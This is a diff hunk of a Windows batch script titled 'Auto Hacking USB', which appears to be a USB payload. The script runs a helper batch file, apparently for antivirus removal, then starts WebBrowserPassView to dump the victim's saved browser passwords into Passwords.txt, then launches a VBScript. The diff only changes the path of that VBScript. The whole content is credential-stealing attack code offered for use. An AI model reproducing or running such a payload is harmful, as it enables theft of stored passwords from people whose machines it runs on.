@@ -4,6 +4,6 @@ title Auto Hacking USB - xyse
 start .\App\avrem.bat
 ping localhost -n 2 >nul
 start .\App\WebPass\WebBrowserPassView.exe /stext Passwords.txt
-start .\App\input.vbs
+start input.vbs
 exit
 
